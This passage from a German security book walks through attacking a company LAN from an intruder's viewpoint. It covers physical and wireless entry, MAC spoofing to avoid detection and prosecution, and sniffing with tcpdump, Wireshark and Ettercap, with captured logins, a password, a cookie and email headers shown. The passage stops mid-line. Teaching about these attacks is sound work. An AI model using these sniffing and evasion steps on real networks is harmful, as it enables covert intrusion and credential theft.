Rootkits werden geheime Hintert\u00fcren installiert, Spuren verwischt und Prozesse getarnt. Im Anschluss daran wird ein Bollwerk errichtet, von dem aus weitere Angriffe erfolgen k\u00f6nnen. Hierbei liegt es im Interesse des Angreifers, sich m\u00f6glichst lange den Zugang zum System zu erhalten und als Nutznie\u00dfer nicht aufzufallen. F\u00fcr die Bereiche Exploiting und Rootkits greifen die Autoren ganz bewusst auf bejahrte Schadsoftware zur\u00fcck. Zum einen besteht dadurch die M\u00f6glichkeit, die Schadsoftware problemlos aus dem Internet zu laden (die Programme werden \u00f6ffentlich angeboten), zum anderen gibt es im Internet umfangreiche Sekund\u00e4rliteratur, die tiefer in die Materie einzudringen vermag, als wir es mit diesem Buch jemals k\u00f6nnten (sofern wir mit diesem Kapitel den Wissensdurst und \u00bbHunger nach mehr\u00ab wecken sollten). Zum besseren Verst\u00e4ndnis und aus Gr\u00fcnden der Nachvollziehbarkeit m\u00f6chten wir dieses Szenario erneut aus der Perspektive eines Angreifers schildern. Wir schl\u00fcpfen somit \u2013 wie auch schon im Bereich WLAN \u2013 in die Rolle eines \u00bbgemeinen Netzwerkforschers\u00ab und simulieren ein oftmals anzutreffendes Vorgehen \u2013 R\u00fcckmeldungen der penetrierten Systeme nebst Schlussfolgerungen zur weiteren Herangehensweise eingeschlossen.\n18.2\nZugriff auf das LAN\nEs gibt diverse M\u00f6glichkeiten f\u00fcr einen Eindringling sich unerlaubt Zugriff auf ein Netzwerk zu verschaffen. Im Heimbereich \u2013 aber auch bei vielen Firmen, die sich ihres unzureichenden Sicherheitsmanagements nicht bewusst sind \u2013 stellen Funknetze eine beliebte Einstiegsluke dar (wie im Kapitel 16 verdeutlicht). In zahlreichen F\u00e4llen dienen Access-Points als Vermittler zwischen LAN und WLAN, sodass es nicht sonderlich schwer ist, \u00fcber ein WLAN den erhofften Zugriff auf das komplette LAN zu erlangen. Den Autoren sind F\u00e4lle bekannt, in denen Unternehmen Hunderte Rechner des Corporate-Networks \u00fcber einen offenen Access-Point in die weite Welt funken lie\u00dfen \u2013 sicherlich ungewollt, denn diese WLANs erfreuten sich unter Netzwerkforschern zu n\u00e4chtlicher Stunde gr\u00f6\u00dfter Beliebtheit.\n18.2 Zugriff auf das LAN\n393\nEine weitere M\u00f6glichkeit, sich Zugang zu einem Unternehmensnetzwerk zu verschaffen, stellt ein pers\u00f6nlicher Besuch vor Ort dar, beispielsweise in Form eines angeblichen Neuzugangs der Putzkolonne, eines Servicetechnikers oder in der Rolle des Lieferanten f\u00fcr den Snack-Automaten der Kantine. In vielen Unternehmen \u2013 gerade bei Mittelst\u00e4ndlern \u2013 sind oftmals auch Netzwerkdosen tempor\u00e4r leer stehender oder frei zug\u00e4nglicher R\u00e4umlichkeiten (z. B. von Besprechungs- und Schulungsr\u00e4umen) komplett durchgeschaltet, sodass von dort aus unbemerkt Zugriff auf das LAN genommen werden kann. Verbindet der Angreifer die Netzwerkdose beispielsweise mit einem eingeschmuggelten Access-Point (binnen weniger Minuten durchgef\u00fchrt) und versteckt diesen in einem Kabelkanal oder einer Gr\u00fcnpflanze, steht dem Zugriff auf das Netzwerk \u00fcber das selbst geschaffene WLAN vorerst nichts im Wege. Den Autoren ist aus der Pr\u00e4-WLAN-Zeit ein skurriler Fall bekannt, in dem durchgepatchte Netzwerkkabel eines Verteilerraums von einem Unbefugten durch den Br\u00fcstungskanal zur Au\u00dfenfassade gelegt wurden. Gl\u00fcck im Ungl\u00fcck: Die eigent\u00fcmlichen Kabel wurden zeitnah bemerkt und der Delinquent gestellt. Zur heutigen Zeit gestaltet sich die Suche nach Einstiegsluken z. B. bei WLAN merklich schwerer. Ebenfalls schwierig zu entdecken ist ein Innent\u00e4ter, der dem Unternehmen nicht mehr wohlgesonnen und der Auffassung ist, unterbezahlt zu sein: Diese Person hat nat\u00fcrlich sehr viel mehr Spielraum. Seit einigen Jahren tragen auch Schadprogramme zunehmend zur gezielten Infiltration eines Unternehmens bei, die zum Beispiel via E-Mail oder Bewerbungsschreiben auf CD-ROM per Post eintrudeln oder infolge pr\u00e4parierter Webseiten. So wird Wirtschaftsspionage \u00fcber das Internet zunehmend eine Herausforderung. Nicht nur die st\u00e4ndig zunehmenden Internetangriffe, etwa aus China, Russland oder anderen L\u00e4ndern, mit denen Daten, Forschungsmaterial, Innovationen und wissenschaftliche Studien ausgesp\u00e4ht werden, bereiten der deutschen Wirtschaft Kopfzerbrechen, sondern auch reale Spione \u2013 seien es spionierende Praktikanten oder als Firmenbesucher getarnte Sp\u00e4her aus dem Ausland. So f\u00e4llt im Bericht194 des Verfassungsschutzes vom Sommer 2008 die Bilanz besonders f\u00fcr jene Unternehmen ern\u00fcchternd aus, die der Auffassung sind, dass sie von Spionage verschont blieben. Ohne konkrete Zahlen zu liefern, wurde nach aktuellen Opfer- und Dunkelfeldstudien bereits ein gro\u00dfer Teil aller Firmen ausspioniert, kleine und mittelst\u00e4ndische ebenso wie gro\u00dfe Konzerne. Der Bereich der IT-Sicherheit spielt eine immer wichtigere Rolle \u2013 egal wie gro\u00df das Unternehmen ist. Seit Jahren bem\u00fchen sich die Verfassungssch\u00fctzer, Unternehmen f\u00fcr existenzbedrohende Spionageangriffe zu sensibilisieren: Die Gefahr f\u00fcr ein Unternehmen, Opfer von Wirtschaftsspionage zu werden, steigt st\u00e4ndig. Alarmierend sei, dass viele Unternehmen sich gar nicht oder nur unzureichend sch\u00fctzten. Der Verfassungsschutz195 spricht auch vor dem Hintergrund der Enttarnung eines international operierenden Spionagenetzes im Internet von einer Best\u00e4tigung der\n194\nhttp://www.handelsblatt.com/politik/deutschland/online-angriffe-auf-deutsche-firmen-steigen;2282388\n195\nhttp://www.securitymanager.de/magazin/artikel_2264_wirtschaftsspionage.html\n394\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nbisherigen Einsch\u00e4tzung: Das sogenannte \u00bbGhostnet\u00ab196 hatte bei bis zu 30 Prozent der infizierten Rechner \u00bbhochrangige Ziele\u00ab wie Regierungsstellen, Au\u00dfenministerien, Medien und internationale Organisationen im Visier. In Deutschland stehen die Botschaften Zyperns, Indiens und Portugals mit auf der Liste. In weniger als zwei Jahren wurden dabei mindestens 1295 Rechner in 103 L\u00e4ndern ausgesp\u00e4ht und zahllose Dokumente gestohlen. Als Vorgeschmack auf die folgenden Kapitel dient bereits an dieser Stelle der mahnende Hinweis, dass sich M\u00e4ngel im Sicherheitsmanagement umgehend r\u00e4chen, wenn sich der wissbegierige und m\u00f6glicherweise hoch motivierte T\u00e4ter erst einmal im Netzwerk befindet \u2013 unabh\u00e4ngig davon, ob der Zugriff direkt von au\u00dfen (beispielsweise durch ein WLAN) oder erst von innen nach au\u00dfen aufgebaut wird (z. B. durch einen mittels Malware verseuchten PC, wie im Kapitel \u00fcber Malware beschrieben).\n18.3\nPassives Mitlesen im LAN: Sniffing\nEin typischer Angreifer wird sich, nachdem der Zugriff auf das LAN erst einmal hergestellt ist \u2013 z. B. durch einen der soeben vorgestellten Wege \u2013 vorerst passiv verhalten, um keinerlei Aufsehen zu erregen. Dieses Verhalten kann sich \u00fcber Monate hinziehen, je nachdem wie es um die Einsch\u00e4tzung des Angreifers bestellt ist, mit dem gewonnen Material m\u00f6glichst sinnvoll und weiterhin unerkannt agieren zu k\u00f6nnen. Grunds\u00e4tzlich zielt kein Angreifer darauf ab, unn\u00f6tiges Aufsehen zu erregen: Zum einen erh\u00f6ht sich das Risiko des Entdecktwerdens, andererseits werden dadurch auch leichtsinnig Chancen verspielt. Der Betreiber des Netzwerks k\u00f6nnte sonst gezielt Gegenma\u00dfnahmen einleiten oder verwundbare Server au\u00dfer Betrieb nehmen. F\u00fcr die Rolle des passiven Zuh\u00f6rers bedient sich der typische Angreifer im ersten Schritt sog. Sniffer-Programme, die das Netzwerkinterface des Rechners in den Promiscuous Mode versetzen. Hierbei handelt es sich um einen bestimmten Empfangsmodus, in dem die Netzwerkkarte den gesamten ankommenden Datenverkehr aufgreift. Die SnifferTools h\u00f6ren den Netzwerkverkehr ab und greifen verwertbare Elemente heraus, wie beispielsweise unverschl\u00fcsselt durch das LAN huschende Passw\u00f6rter oder E-Mails. Sniffer leisten zur Netzwerkanalyse einen wichtigen Beitrag \u2013 insbesondere dann, wenn es darum geht, sich in einem fremden Netz einen ersten \u00dcberblick zu verschaffen. Wir gehen im folgenden Szenario davon aus, dass der Angreifer mit seinem LinuxSystem unmittelbaren Zugriff auf das Netzwerk erlangt hat und dass es sich um ein sternf\u00f6rmiges Netzwerk mit Hub handelt (somit um ein Shared-Media-Network) \u2013 und nicht um eine geswitchte Umgebung. Weshalb diese Unterscheidung wichtig ist, erl\u00e4utern wir zu einem sp\u00e4teren Zeitpunkt. Bevor wir beginnen, geben wir unserer Netzwerkkarte sicherheitshalber eine \u00bboriginelle\u00ab MAC-Adresse. Wir m\u00fcssen damit rechnen, dass der Betreiber des Netzwerks Schutzw\u00e4lle errichtet hat (beispielsweise in Form eines IDS) und somit unserer MAC-Adresse habhaft wird. Da die MAC-Adresse so etwas wie die Fahrgestellnummer der Netzwerk196\nhttp://www.heise.de/newsticker/meldung/Chinesische-Spionage-Software-infiltriert-Rechner-tibetischerExil-Regierung-Update-210074.html\n18.3 Passives Mitlesen im LAN: Sniffing\n395\nkarte darstellt \u2013 es handelt sich somit um ein einmaliges Kennzeichen \u2013 kann das den Angreifer im schlimmsten Fall vor Probleme stellen, wenn n\u00e4mlich der Betreiber des Netzwerks Anzeige gegen Unbekannt erstattet und das Angriffs-Equipment, z. B. das Notebook samt Netzwerkkarten durch einen ung\u00fcnstigen Zufall in die H\u00e4nde der Staatsanwaltschaft gelangt. Die \u00c4nderung der MAC-Adresse l\u00e4sst sich unter Linux, wie bereits im Kapitel WLAN erl\u00e4utert, sehr leicht mit dem Kommando ifconfig eth0 hw ether durchf\u00fchren: root@discordia:~# ifconfig eth0 up root@discordia:~# ifconfig eth0 eth0 Link encap:Ethernet HWaddr 00:21:86:58:f0:ce inet6 addr: fe80::221:86ff:fe58:f0ce/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:4 errors:0 dropped:0 overruns:0 frame:0 TX packets:9 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:100 RX bytes:248 (248.0 B) TX bytes:706 (706.0 B) Memory:fe200000-fe220000 root@discordia:~# ifconfig eth0 down root@discordia:~# ifconfig eth0 hw ether BA:BE:FA:CE:BA:BE root@discordia:~# ifconfig eth0 up root@discordia:~# ifconfig eth0 eth0 Link encap:Ethernet HWaddr ba:be:fa:ce:ba:be inet6 addr: fe80::b8be:faff:fece:babe/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:6 errors:0 dropped:0 overruns:0 frame:0 TX packets:15 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:100 RX bytes:372 (372.0 B) TX bytes:1174 (1.1 KB) Memory:fe200000-fe220000 root@discordia:~#\nWem die soeben vorgestellte Prozedur zu aufwendig erscheint und die MAC-Adresse m\u00f6glicherweise bei jedem Ladevorgang kaschiert werden soll, dem sei ein pers\u00f6nliches Skript, das bereits vorgestellte Tool GNU MacChanger197 oder Travesty198 empfohlen. Windows-Anwender k\u00f6nnen mit einer Software wie SMAC199 jeder Netzwerkkarte mit einem Tastendruck eine neue, frisierte MAC-Adresse zuweisen.\n197\nhttp://www.alobbs.com/macchanger\n198\nhttp://www.mcgrewsecurity.com/tools/travesty\n199\nhttp://www.klcconsulting.net (kostenlose Evaluation Edition)\n396\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nBild 18.1: MAC-Adresse eines Windows-PCs \u00e4ndern\nIm Anschluss geben wir unserem System eine x-beliebige IP-Adresse (z. B. durch ifconfig eth0 192.168.23.23 netmask 255.255.255.0 up) und starten eines der im Folgenden vorgestellten Programme.\n18.3.1 Tcpdump Eines der bekanntesten Tools zur \u00dcberwachung und Auswertung von Netzwerkverkehr ist Tcpdump, das f\u00fcr die meisten UNIX-Systeme verf\u00fcgbar und bei vielen LinuxDistributionen im Grundsystem verankert ist. Tcpdump ist ideal, um einen kurzen Blick in das Netzwerkleben zu riskieren und stellt oftmals den ersten Kontakt mit einem unbekannten Netz dar. Zus\u00e4tzlich bieten viele weitere Programme die M\u00f6glichkeit, die mit Tcpdump gewonnenen Daten einzubinden, sodass sp\u00e4teren Analysen viel Freiraum geboten wird. Beim Aufruf von Tcpdump erwartet den interessierten Netzwerkforscher ein Datenstrom, der in etwa aussieht wie folgt (das Logfile ist stark gek\u00fcrzt): root@discordia:/# tcpdump tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 21:44:43.124617 IP 192.168.1.55.1071 > 192.168.1.100.microsoft-ds: S 2764174690:2764174690(0) win 5840\n18.3 Passives Mitlesen im LAN: Sniffing\n397\n21:44:43.124632 IP 192.168.1.100.microsoft-ds > 192.168.1.55.1071: S 2676864166:2676864166(0) ack 2764174691 win 5792 21:44:43.124641 IP 192.168.1.55.1071 > 192.168.1.100.microsoft-ds: . ack 1 win 1460 (...) 21:48:32.085445 IP 192.168.1.100.59579 > post.strato.de.pop3: S 1977862138:1977862138(0) win 5840 21:48:32.085863 IP 192.168.1.223.47235 > firewall.discordiawerke.de.domain: 25405+ PTR? 136.145.169.81.in-addr.arpa. (45) 21:48:32.104189 IP post.strato.de.pop3 > 192.168.1.100.59579: S 3087109032:3087109032(0) ack 1977862139 win 50400 (...) 21:50:14.499429 IP www.heise.de.www > 192.168.1.10.1506: . ack 824 win 5179 21:50:14.499858 IP 192.168.1.10.1506 > www.heise.de.www: . 65535 21:50:14.501668 IP www.heise.de.www > 192.168.1.10.1506: . ack 824 win 5179 21:50:14.501684 IP ftp.sunet.se.www > 192.168.1.10.1512: . win 16895 21:50:14.509968 IP 192.168.1.10.1518 > www.heise.de.www: S 777181421:777181421(0) win 65535 (...)\n2913:4365(1452) ack 4365 win 4365:5817(1452) ack 2521064146\n22:32:58.127450 IP 192.168.1.217.57595 > firewall.discordiawerke.de.domain: 2910+ A? www.tauschticket.de. (37) 22:32:58.140122 IP vpn.vorstand.discordiawerke.de.1146 > 192.168.1.100.902: P 1080998:1081035(37) ack 26339232 win 16563 22:32:58.148249 IP firewall.discordiawerke.de.domain > 192.168.1.217.57595: 2910 4/0/0 A internext.de,[|domain] 22:32:58.148376 IP 192.168.1.223.44946 > firewall.discordiawerke.de.domain: 49981+ PTR? 46.171.34.195.in-addr.arpa. (44) 22:32:58.155721 IP 192.168.1.217.1081 > internext.de.www: S 3157447988:3157447988(0) win 65535 ^C 540561 packets captured 554223 packets received by filter 13662 packets dropped by kernel root@discordia:~#\nDieses Logfile wirkt auf den ersten Blick abschreckend, bietet aber einen ersten Einblick in den Netzwerkverkehr und erm\u00f6glicht eine ungef\u00e4hre Vorstellung von Gr\u00f6\u00dfe, IPAdresskreis, Clients und verwendeten Diensten. Eine n\u00fctzliche Eigenschaft von Tcpdump ist, dass viele Programme mit den gewonnenen Daten betankt werden k\u00f6nnen\n398\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n(so beispielsweise die sp\u00e4ter vorgestellten Programme Wireshark und P0f). Besonders spannend an diesem Mitschnitt ist beispielsweise die Erkenntnis, dass auch unverschl\u00fcsselte Protokolle wie POP3, HTTP und FTP zum Einsatz zu kommen scheinen; ein tieferes Abtauchen in den Datenstrom erscheint somit vielversprechend. Nach dem ersten Sichtkontakt mit Tcpdump bieten sich vielseitigere Sniffer an, die mit strukturierbaren Elementen eine profundere Analyse des Netzwerkverkehrs gestatten. Zur Diskussion stehen hierbei Wireshark und Ettercap NG, wobei die Autoren das letztgenannte Tool f\u00fcr den \u00bbspeziellen Blick\u00ab auf Kennw\u00f6rter bevorzugen. Als Vorbereitung auf die kommenden Schritte empfiehlt es sich zum jetzigen Zeitpunkt, unserem Client eine IP-Adresse aus dem Kreis des zu untersuchenden Netzwerks zu vergeben. Hierbei m\u00fcssen wir sicherstellen, dass die von uns zu nutzende IP-Adresse nicht verwendet wird \u2013 entweder durch \u00bbMut zur L\u00fccke\u00ab (wir w\u00e4hlen eine IP-Adresse, die im Datenstrom bislang noch nicht in Erscheinung trat) oder durch einen DHCP-Request. Die manuelle Vergabe einer IP-Adresse gestaltet sich wie folgt (vgl. auch hierzu das WLAN-Kapitel \u00bbZugriff auf ein WLAN, das keinen DHCP-Dienst anbietet\u00ab): ifconfig eth0 192.168.1.23 netmask 255.255.255.0 up Hier kann der Angreifer Gl\u00fcck haben z. B., indem die IP-Adresse frei ist und er sich korrekt einbuchen kann, oder auch nicht. Im letzteren Fall \u00e4ndert man die IP-Adresse auf einen anderen Wert und hofft, beim zweiten Versuch erfolgreicher zu sein. Findet sich jedoch im Netzwerk ein DHCP-Server, der Anfragen beantwortet, l\u00e4sst sich z. B. mit folgendem Befehl testhalber eine IP-Adresse anfordern (vgl. auch hierzu im Kapitel 16 den Abschnitt Zugriff auf ein offenes WLAN): dhcpcd-bin -T eth0 Der gesamte Discover/Request-Ablauf zum unverbindlichen Anfragen einer IP-Adresse verl\u00e4uft wie folgt: root@discordia:~# dhcpcd-bin -T eth0 IPADDR='192.168.1.223' NETMASK='255.255.255.0' NETWORK='192.168.1.0' BROADCAST='192.168.1.255' ROUTES='' GATEWAYS='192.168.1.1' DNSDOMAIN='discordiawerke.de' DNSSERVERS='192.168.1.1' DHCPSID='192.168.1.1' LEASETIME='3600' RENEWALTIME='1800' REBINDTIME='3150' INTERFACE='eth0' CLASSID='dhcpcd 3.2.3' CLIENTID='ff:65:74:68:30:00:01:00:01:12:fc:71:64:ba:be:fa:ce:ba:be' DHCPCHADDR='ba:be:fa:ce:ba:be'\n18.3 Passives Mitlesen im LAN: Sniffing\n399\n# dhcpcd-1.x and 2.x compatible variables DNS='192.168.1.1' GATEWAY='192.168.1.1' root@discordia:~#\nIn diesem Beispiel liefert der DHCP-Server die IP-Adresse 192.168.1.223 als potenziell frei zur\u00fcck, mit der man sich als vollwertiges Mitglied der Netzwerkgemeinde f\u00fchlen k\u00f6nnte. Es sei angemerkt, dass sp\u00e4testens beim Kontakt des DHCP-Servers der bisherige Schutz durch ausschlie\u00dflich passives Vorgehen verloren geht. Der DHCP-Server registriert n\u00e4mlich die Anfrage und vermerkt beispielsweise die MAC-Adresse des Clients. Verfolgt der Administrator (oder ein IDS) regelm\u00e4\u00dfig die Logfiles und das Netzwerkgeschehen, ist ein Netzspion binnen k\u00fcrzester Zeit enttarnt. Aber auch im Heimbereich ist man vor diesen Unp\u00e4sslichkeiten nicht verschont: Den meisten SOHO-WLAN-Routern, die nur rudiment\u00e4r \u00fcber eine DHCP-History verf\u00fcgen, lassen sich dynamische Zuordnungen der momentan eingebuchten Teilnehmer entnehmen. Wer die potenzielle Gefahr in den Wind schl\u00e4gt und die Werte nicht manuell per ifconfig und route vergeben, sondern \u00fcber den DHCP-Server beziehen m\u00f6chte, verwendet die folgenden Kommandos (je nach eingesetztem DHCP-Client): root@discordia:~# dhcpcd-bin eth0 root@discordia:~# dhcpcd.sh: interface eth0 has been configured with new IP=192.168.1.223 root@discordia:~# ifconfig eth0 eth0 Link encap:Ethernet HWaddr ba:be:fa:ce:ba:be inet addr:192.168.1.223 Bcast:192.168.1.255 Mask:255.255.255.0 inet6 addr: fe80::221:86ff:fe58:f0ce/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:84 errors:0 dropped:0 overruns:0 frame:0 TX packets:14 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:100 RX bytes:6359 (6.3 KB) TX bytes:1732 (1.7 KB) Memory:fe200000-fe220000 root@discordia:~#\nZur Frage Komfort vs. Paranoia muss jeder selbst entscheiden, welche Herangehensweise f\u00fcr das weitere Vorgehen der beste Weg ist. Bei DHCP erhalten wir im Normalfall alles, was wir ben\u00f6tigen: eine freie IP-Adresse, das Gateway und DNS-Eintr\u00e4ge. Bei der manuellen Herangehensweise mag es eine Zeit dauern, bis die Informationen eintrudeln. Nach Auffassung der Autoren ist die ausschlie\u00dflich passive Rolle weiterhin von Vorteil. DHCP stellt einen schnellen und bequemen Weg dar, sich in ein Netzwerk einzubuchen, kann aber das bisherige Vorgehen mit einem Schlag zunichtemachen. Der manuelle\n400\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nWeg, der weniger Aufsehen erregt, ist m\u00fchsamer und nimmt mehr Zeit in Anspruch. Sp\u00e4ter jedoch erh\u00e4lt man die ben\u00f6tigten Daten wie von selbst.\n18.3.2 Wireshark Bei Wireshark handelt es sich um einen freien und leistungsf\u00e4higen Netzwerk-Analyzer mit grafischer Oberfl\u00e4che, der sich mittlerweile auf zahlreichen Plattformen heimisch f\u00fchlt (von AIX, BSD, Linux, Windows, Mac OS X bis zu Solaris). Beim Start pr\u00e4sentiert sich Wireshark wie folgt:\nBild 18.2: Wireshark nach dem Start\nEin beherzter Kick auf Capture nebst Definition der Netzwerkkarte l\u00e4sst den Netzwerkstrom auf Wireshark einprasseln, sodass sich die Tabelle rasch mit Inhalt f\u00fcllt.\nBild 18.3: Wireshark bei Einsicht in den Datenverkehr\n18.3 Passives Mitlesen im LAN: Sniffing\n401\nWireshark versteht sich bravour\u00f6s auf die Beobachtung des Datenverkehrs, enth\u00e4lt viele Analyse- und Statistikfunktionen und wird oftmals zur Fehlersuche in Netzwerken eingesetzt. Neben der Suche nach Fehlern lassen sich den Datenpaketen selbstredend auch pikante Details entnehmen. So werden beispielsweise die im Netzwerk verwendeten IP-Adressen samt MAC-Adressen (etwa 192.168.1.100, 192.168.1.229 und 192.168.1.241) sowie den im Einsatz befindlichen Netzwerkdiensten erst durch Wireshark in ansprechender Form aufbereitet. Insbesondere die vielf\u00e4ltigen Filter, die auch w\u00e4hrend des Capturings definiert werden k\u00f6nnen, erm\u00f6glichen eine erste Einsch\u00e4tzung \u00fcber Art und Umfang der weiteren Vorgehensweise. Interessant erscheinen insbesondere unverschl\u00fcsselte Verbindungen innerhalb des Netzwerks wie beispielsweise POP3/SMTP, IMAP, VNC oder FTP, stellen sie doch eine leichte Beute dar.\nBild 18.4: Eine gezielte Suche nach POP kann nicht schaden... Hu. Da ist schon das erste Kennwort!\nDer Men\u00fcpunkt Statistics l\u00e4sst beispielsweise \u00fcber den Unterpunkt Conversations interessante R\u00fcckschl\u00fcsse auf \u00bbTraffic-Schleudern\u00ab im Netzwerk zu (viel Netzwerklast deutet oftmals auf Server hin, die eine Schl\u00fcsselrolle einnehmen) und Protocol Hierarchy zeigt die im Netzwerk \u00bbgespielte Musik\u00ab \u2013 f\u00fcr uns eine erste Erkenntnis dar\u00fcber, wie viele Pakete sich beispielsweise FTP, SMB, IRC, POP oder auch HHTP zuordnen lassen. Fast nebenbei erfahren wir \u00fcber die MAC-Adressen, dass auch Virtualisierungsl\u00f6sungen betrieben werden.\n402\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nBild 18.5: Hersteller \u00bbVMware\u00ab deutet auf VMware- oder ESX-Server hin\nFestzuhalten ist, dass uns Wireshark mannigfaltige Einblicke in das Netzwerkgeschehen liefert. Da Wireshark die Captures auch speichern kann, k\u00f6nnen wir die m\u00f6glicherweise bereits \u00bbonline\u00ab begonnene Analyse auch zu einem sp\u00e4teren Zeitpunkt \u2013 somit \u00bboffline\u00ab \u2013 vollenden. Gleiches gilt im \u00dcbrigen auch f\u00fcr diverse Logfiles, die von anderen Traffic Analyzern gewonnen wurden (zum Beispiel Tcpdump).\n18.3.3 Ettercap NG Bei Ettercap NG (oder Ettercap) handelt es sich nach Auffassung der Autoren um eines der leistungsf\u00e4higsten Programme, die zur Analyse eines Netzwerks zur Verf\u00fcgung stehen. Wir werden uns aufgrund der vielf\u00e4ltigen M\u00f6glichkeiten nur auf die elementarsten Funktionen beschr\u00e4nken, raten aber jedem Netzwerkforscher, sich intensiver mit diesem Sniffer zu besch\u00e4ftigen. Um den andernfalls bei der Initialisierung \u00fcblichen ARP-Scan zu unterbinden, empfiehlt es sich, Ettercap NG im Silent Mode zu starten. Im folgenden Szenario liefert Ettercap NG wertvolle Erkenntnisse \u00fcber Protokolle (POP3, HTTP, SMB), Login-Daten, UserKonten, im Einsatz befindliche Webbrowser nebst Hinweisen auf eine unterbrechungsfreie Stromversorgung (aus \u00dcbersichtsgr\u00fcnden gefettet dargestellt und gek\u00fcrzt): root@discordia:~# ettercap -T -z -i eth0 ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA Listening on eth0... (Ethernet) eth0 ->\nba:be:fa:ce:ba:be\n192.168.1.223\n255.255.255.0\n18.3 Passives Mitlesen im LAN: Sniffing\n403\nSSL dissection needs a valid 'redir_command_on' script in the etter.conf file Privileges dropped to UID 65534 GID 65534... 28 39 53 7587 1698 2183\nplugins protocol dissectors ports monitored mac vendor fingerprint tcp OS fingerprint known services\nStarting Unified sniffing...\nText only Interface activated... Hit 'h' for inline help AUTH CRAM-MD5. + PDYwODgyMDEuMTExNzEuMTI2NTMxMjg5MEBwb3N0LndlYm1haWxlci5kZT4=. bmV3c2xldHRlckB3ZXllcnQuZGUgMzUyNjBlZTQ3MzI2MWU1NTg5ZDhiMzc1NWQ3MzQ4NjE=. +OK User logged in, proceed.. STAT. +OK 0 0. QUIT. +OK Closing connection. _............post.strato.de....._............post.strato.de..............!. .Q...+OK POP3 server ready . CAPA. +OK Capability list follows:. EXPIRE 7. PIPELINING. RESP-CODES. TOP. USER. UIDL. SASL CRAM-MD5. (...) .(DATE ..HOSTNAME ..RELEASE .-VERSION ..UPSNAME ..CABLE ..MODEL ..UPSMODE\n: : : : : : : :\nThu Feb 04 20:48:33 CET 2010 fileserver 3.14.2 3.14.2 (15 September 2007) debian hal9001 USB Cable Back-UPS BR 800 ShareUPS Master\n404\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\n.(STARTTIME: Fri Jan 29 15:52:09 CET 2010 ..SHARE ..STATUS (...)\n: ShareUPS : ONLINE\n....M.A.C.M.I.N.I.m.a.r.k.t.i.n.g.M.A.C.M.I.N.I.;&$.'..u.................C2 ..X..N.^....K.9....T..W.i.n.d.o.w.s. .2.0.0.2. .S.e.r.v.i.c.e. .P.a.c.k. .3. .2.6.0.0...W.i.n.d.o.w.s. .2.0.0.2. .5...1........n.SMBs.......................e.......... .C...0... ..U.n.i.x...S.a.m.b.a. .3...0...2.8.a...d.i.s.c.o.r.d.i.a.w.e.r.k.e.......T.SMBu..................\n[[email protected]](/cdn-cgi/l/email-protection)\n.....)..\\.\\.F.I.L.E.S.E.R.V.E.R.\\.M.A.R.K.E.T.I.N.G...?????..1 68.1.110:4487 --> 149.9.0.58:9001 | A (...) GET /stil/ho/standard2008.css HTTP/1.1. Host: www.google.de. User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1) Accept: text/css,*/*;q=0.1. Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3. Accept-Encoding: gzip,deflate. Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7. Keep-Alive: 300. (...) Message-ID: . Date: Thu, 04 Feb 2010 21:15:36 +0100. From:\n[[email protected]](/cdn-cgi/l/email-protection)\n. User-Agent: Thunderbird 2.0.0.23 (Windows/20090812). MIME-Version: 1.0. To: heikolan\n[[email protected]](/cdn-cgi/l/email-protection)\n. Subject: eBay-Rechnung vom Sonntag, 31. Januar 2010. Content-Type: text/plain; charset=windows-1252; format=flowed. Content-Transfer-Encoding: 8bit. . . -------------------------------------------------------------------------------------------------------------------- . . eBay hat diese Mitteilung an Heiko Langer (hasenpfote8) gesendet.. Ihr Vor- und Nachname in dieser Mitteilung sind ein Hinweis darauf, dass . die Nachricht tats.chlich von eBay stammt.. Mehr zum Thema: http://pages.ebay.de/help/confidence/name-useridemails.html. ----------------------------------------------------------------------------------------\n18.3 Passives Mitlesen im LAN: Sniffing\n405\n(...) Connection: keep-alive. Referer: http://www.tauschticket.de/. Cookie: sid=e2a7f6e0f820bff1674b41811cc5b870. Content-Type: application/x-www-form-urlencoded. Content-Length: 70. . action=1&src=reiterLogin&login=buecherwurm8&passwort=buchregal&x=0&y=0u!... ........217.1.168.192.in-addr.arpa.....u!...........217.1.168.192.inaddr.arpa.....1.217:1265 | SA (...)\nJe nach gew\u00fcnschtem Einsatzzweck f\u00fchrt das Kommando ettercap -T -d -q -z m\u00f6glicherweise schneller zum Ziel. Hierbei startet Ettercap NG zwar erneut im Textund im Silent Mode, l\u00f6st aber dar\u00fcber hinaus auch DNS-Namen auf und verzichtet auf die Darstellung des Inhalts von Paketen. Ettercap NG ber\u00fccksichtigt danach ausschlie\u00dflich das, wonach jeder Netzwerkforscher giert: Login-Daten! Auch hier sind pikante Daten in Fettdruck dargestellt: root@discordia:~# ettercap -T -q -z -i eth0 ettercap NG-0.7.3 copyright 2001-2004 ALoR & NaGA Listening on eth0... (Ethernet) eth0 ->\nba:be:fa:ce:ba:be\n192.168.1.223\n255.255.255.0\nSSL dissection needs a valid 'redir_command_on' script in the etter.conf file Privileges dropped to UID 65534 GID 65534... 28 39 53 7587 1698 2183\nplugins protocol dissectors ports monitored mac vendor fingerprint tcp OS fingerprint known services\nStarting Unified sniffing...\n406\nKapitel 18 \u2013 Szenario VII: Netzwerkarbyten: Wenn der Feind innen hackt\nText only Interface activated... Hit 'h' for inline help SMB : 192.168.1.216:139 -> USER: ogehrling HASH: 